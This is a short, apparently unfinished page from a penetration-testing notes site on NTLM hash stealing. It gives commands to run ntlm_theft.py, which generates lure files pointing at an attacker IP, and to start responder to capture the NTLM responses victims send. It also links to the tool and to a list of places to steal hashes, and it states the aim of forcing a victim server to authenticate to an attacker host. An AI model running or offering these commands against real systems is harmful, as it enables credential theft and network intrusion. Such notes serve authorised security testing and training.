---
label: NTLM Hash Stealing
disabled: true
---

{/*TODO: ntlm_theft.py, responder, .ini files, UNC path*/}

Generate multiple files to steal NTLM response using [https://github.com/Greenwolf/ntlm_theft](ntlm_theft.py) script.

```bash
# Generate all files
python ntlm_theft.py -s $responder_ip -f $filename -g all

# Grab all NTLM responses
responder -I $net_interface
```

Places and tricks to steal NT hashes. The trick is to force victim server to auth attempt with attacker host. [Check out places to steal NT hash](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds).
